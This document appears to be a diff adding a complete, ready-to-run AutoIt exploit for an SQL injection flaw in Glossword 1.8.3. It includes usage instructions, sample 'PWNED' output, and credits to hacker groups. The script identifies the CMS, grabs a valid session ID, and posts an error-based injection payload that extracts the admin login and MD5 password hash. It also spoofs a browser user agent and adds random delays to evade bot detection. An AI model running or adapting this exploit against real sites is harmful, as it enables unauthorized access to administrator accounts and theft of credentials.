@@ -1,0 +1,259 @@
+#cs
+==============================================================
+Vulnerable Software: Glossword 1.8.3
+Official site: http://sourceforge.net/projects/glossword/
+Download: http://sourceforge.net/projects/glossword/files/glossword/1.8.3/
+Vuln: SQLi
+==================THIS IS A WHOLE EXPLOIT=====================
+Exploit Coded In AutoIT.
+To exploit this vulnerability magic_quotes_gpc must be turned off on server side.
+Print screen: http://s004.radikal.ru/i206/1302/89/d7398ade1cd7.png
+POC video: http://youtu.be/55IaNTQS3Fk
+
+Exploit usage:
+
+C:\0day>glossa.exe http://hacker1.own /glossword/glossword/ 2
+
+
+##############################################################
+#           Glossword 1.8.3 SQL injection Exploit            #
+# Usage: glossa.exe http://site.tld  /installdir/  UID (int) #
+#        DON'T HATE THE HACKER, HATE YOUR OWN CODE!          #
+#            VULN/Exploit: AkaStep & HERO_AZE                #
+##############################################################
+
+##############################################################
+[*] SENDING FAKE SESSUID: ea0f5d8c7c2c8a2f9f7c3b3e5a3d4f5d [*]
+##############################################################
+
+##############################################################
+[*]                  CMS is GLOSSWORD!                     [*]
+##############################################################
+
+##############################################################
+[*]                FETCHING VALID SESSUID                  [*]
+##############################################################
+
+##############################################################
+[*]  Got VALID SESSUID: aa0e680bef2679932393abe72b78ef03   [*]
+##############################################################
+
+##############################################################
+[*]                  !~ P*W*N*E*D ~!                       [*]
+--------------------------------------------------------------
+[*] Login: admin                                           [*]
+--------------------------------------------------------------
+[*] Password: (MD5) 260efaff0cac0f78a53ccc540e89e72d       [*]
+--------------------------------------------------------------
+Admin Panel: hacker1.own/glossword/glossword/gw_admin/login.php
+--------------------------------------------------------------
+[*]                    Good Luck;)                         [*]
+##############################################################
+[*]                     DONE                               [*]
+##############################################################
+
+
+
+
+#ce
+
+
+#NoTrayIcon
+#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
+#AutoIt3Wrapper_Outfile=glossa.exe
+#AutoIt3Wrapper_UseUpx=n
+#AutoIt3Wrapper_Change2CUI=y
+#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
+#include "WinHttp.au3"
+#include <inet.au3>
+#include <String.au3>
+
+$triptrop=@CRLF & _StringRepeat('#',62) & @CRLF;
+$exploitname=@CRLF & _StringRepeat('#',62) & @CRLF & _
+'#' & _StringRepeat(' ',11) & 'Glossword 1.8.3 SQL injection Exploit ' & _StringRepeat(' ',11) & '#' & @CRLF  & _
+'# Usage: ' & @ScriptName &  ' http://site.tld ' & ' /installdir/ ' & ' UID (int) #' & _
+@CRLF & "#        DON'T HATE THE HACKER, HATE YOUR OWN CODE!          #" & @CRLF & _
+'#            VULN/Exploit: AkaStep & HERO_AZE                #' & @CRLF & _StringRepeat('#',62);
+ConsoleWrite(@CRLF & $exploitname & @CRLF)
+
+$method='POST';
+$vulnurl='gw_admin/login.php'
+Global $sessid=0
+$cmsindent='lossword'; # We will use it to identify CMS #;
+$adminpanel=$vulnurl
+
+;#~  Impersonate that We Are Not BOT or exploit.We are human who uses IE.# ~;
+$useragent='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; SV1; .NET CLR 1.1.4325)';
+$msg_usage="Command Line Plizzzz => " & @CRLF & "Usage: " & @ScriptName &  ' http://site.tld ' & ' /installdir/ ' &  ' UID (int)' & @CRLF
+if  $CmdLine[0] <> 3 Then
+  ConsoleWrite(@CRLF & _StringRepeat('#',62) & @CRLF & $msg_usage & @CRLF & _StringRepeat('#',62) & @CRLF);
+  MsgBox(64,"",$msg_usage);
+  exit;
+EndIf
+
+
+if $CmdLine[0]=3 Then
+$targetsite=$CmdLine[1];
+$installdir=$CmdLine[2];
+$uidtoattack=Number(StringMid($CmdLine[3],1,255));
+EndIf
+
+if not StringIsDigit($uidtoattack) Then
+  ConsoleWrite(' UID is wrong! Exit' );
+  Exit;
+  EndIf
+
+
+
+if StringStripWS($targetsite,8)='' OR StringStripWS($installdir,8)='' Then
+  ConsoleWrite('Are you kidding meeeeen?');
+  Exit;
+EndIf
+
+
+HttpSetUserAgent($useragent)
+$doublecheck=InetGet($targetsite,'',1);
+if @error Then
+  ConsoleWrite('[*] Incorrect Domain Name/Or you are Offline! [*]' & @CRLF)
+  Exit;
+EndIf
+
+
+
+sleep(Random(1200,2500,1));
+
+sendfakeretrivevalidsess($targetsite,$installdir)
+
+HttpSetUserAgent($useragent);
+$sidentify=_INetGetSource($targetsite & $adminpanel,True);
+
+Func exploit($targetsite,$installdir,$sessid)
+Global $sAddress = $targetsite
+Global $PAYLOADTOSEND ="arPost[user_name]=') AND (select floor(rand(0)*2) from(select count(*)," & _
+"concat((select concat(0x3C73696B6469723E,login,0x7c,password,0x3C2F73696B6469723E,0x7c) from " & _
+"gw_auth where id_auth=" & $uidtoattack & "),floor(rand(0)*2))x from information_schema.tables group by x)a)-- " & _
+" AND 1=('1&arPost[user_email]=trueownage&a=lostpass&sid=" & $sessid & "&post=Send password";
+Global $sDomain = $targetsite
+Global $sPage = $installdir & $vulnurl
+Global $sAdditionalData = $PAYLOADTOSEND
+Global $hOpen = _WinHttpOpen($useragent)
+Global $hConnect = _WinHttpConnect($hOpen, $sDomain)
+Global $hRequest = _WinHttpOpenRequest($hConnect, "POST", $sPage, -1, -1, -1, '')
+_WinHttpSendRequest($hRequest, "Content-Type: application/x-www-form-urlencoded", $sAdditionalData)
+_WinHttpReceiveResponse($hRequest)
+Global $sReturned
+If _WinHttpQueryDataAvailable($hRequest) Then
+    Do
+        $sReturned &= _WinHttpReadData($hRequest)
+    Until @error
+
+  if StringInStr($sReturned,'<sikdir>') and StringInStr($sReturned,'</sikdir>') Then
+
+$zsuxxv = StringRegExp($sReturned, '<(?i)sikdir>(.*?)</(?i)sikdir>', 1)
+For $x = 0 To UBound($zsuxxv) - 1
+  Beep(100,1000);
+    ConsoleWrite($triptrop & '[*]                  !~ P*W*N*E*D ~!                       [*] ' & _
+  StringReplace($triptrop,'#','-') & '[*] Login: ' & StringMid($zsuxxv[$x],1,StringInStr($zsuxxv[$x],'|')-1) & _
+  _StringRepeat(' ',StringLen($triptrop)-18-StringLen(StringMid($zsuxxv[$x],1,StringInStr($zsuxxv[$x],'|')-1))) & '[*]' & _
+  StringReplace($triptrop,'#','-') & '[*] Password: (MD5) ' & StringReplace($zsuxxv[$x],StringMid($zsuxxv[$x],1,StringInStr($zsuxxv[$x],'|')),'') & _
+  '       [*] ' & _
+  StringReplace($triptrop,'#','-') & _
+  'Admin Panel: ' & $targetsite & $installdir &$adminpanel & ' ' & StringReplace($triptrop,'#','-') & _
+  '[*]                    Good Luck;)                         [*]' & _
+  $triptrop & '[*]                     DONE                               [*]' & _
+  $triptrop);
+Next
+
+Else
+
+  ConsoleWrite($triptrop & '[*] ' & _StringRepeat(' ',18) & '   NO SUCH UID!   ' &  _StringRepeat(' ',18) & _
+  ' [*]' & $triptrop);
+  Beep(1500,1000);
+  Exit
+
+
+    EndIf
+EndIf
+_WinHttpCloseHandle($hRequest)
+_WinHttpCloseHandle($hConnect)
+_WinHttpCloseHandle($hOpen)
+EndFunc;=> exploit();
+
+
+Func  sendfakeretrivevalidsess($targetsite,$installdir)
+
+$fakesessionID='';
+Do
+$fakesessionID&=Chr(Random(97,102,1)) & Random(0,9,1)
+until StringLen($fakesessionID)=32
+
+$fakesessionID=StringMid($fakesessionID,Random(1,32,1),1) & StringMid($fakesessionID,1,StringLen($fakesessionID)-1)
+ConsoleWrite($triptrop & '[*] SENDING FAKE SESSUID: ' & $fakesessionID &  ' [*] ' &  $triptrop)
+sleep(Random(1000,2500,1))
+$rtarget=$targetsite & $installdir &"gw_admin/login.php?visualtheme=gw_admin&sid=" &$fakesessionID;
+HttpSetUserAgent($useragent);
+$str=_INetGetSource($rtarget);
+if StringInStr($str,"Session does not exist.") then
+ConsoleWrite($triptrop & '[*]' &  _StringRepeat(' ',18) & 'CMS is GLOSSWORD!  ' &  _StringRepeat(' ',19) & '[*]' & $triptrop);
+sleep(Random(1000,2500,1))
+Else
+  ConsoleWrite($triptrop & '[*]' & _StringRepeat(' ',11) &'NOPE:( THIS IS NOT GLOSSWORD CMS.' &_StringRepeat(' ',12) &'[*]' & $triptrop);
+exit;
+EndIf
+$i=123
+$mystr='';
+ConsoleWrite($triptrop & '[*]' & _StringRepeat(' ',16) & 'FETCHING VALID SESSUID' & _StringRepeat(' ',17) & ' [*]' & $triptrop)
+sleep(Random(1000,2500,1))
+Do
+$i+=1;
+if $i>=4000 then ExitLoop;//Just for make sure we are not going to infinitive loop if there any error occurs.//
+$mystr&=StringMid($str,$i,1)
+until StringInStr($mystr,chr(34));
+
+
+$sessid=StringMid($mystr,StringInStr($mystr,Chr(61))+1,32)
+if not $sessid =32 Then
+  ConsoleWrite($triptrop & '[*] Sorry Man! Theris an error while fetching new VALID SESSUID  [*]' & $triptrop)
+  exit;
+Else
+  ConsoleWrite($triptrop & '[*]  Got VALID SESSUID: ' & $sessid &  '   [*]' & $triptrop)
+EndIf
+$targetsite=StringReplace(StringReplace($targetsite,'http://',''),'/','')
+exploit($targetsite,$installdir,$sessid)
+EndFunc;=>sendfakeretrivevalidsess();
+
+
+
+
+#cs
+
+================================================
+           KUDOSSSSSSS
+================================================
+packetstormsecurity.org
+packetstormsecurity.com
+packetstormsecurity.net
+securityfocus.com
+cxsecurity.com
+security.nnov.ru
+securtiyvulns.com
+securitylab.ru
+secunia.com
+securityhome.eu
+exploitsdownload.com
+osvdb.com
+websecurity.com.ua
+1337day.com
+itsecuritysolutions.org
+
+to all Aa Team + to all Azerbaijan Black HatZ
++ *Especially to my bro CAMOUFL4G3 *
+To All Turkish Hackers
+
+Also special thanks to: ottoman38 & HERO_AZE
+================================================
+
+/AkaStep
+
+
+#ce
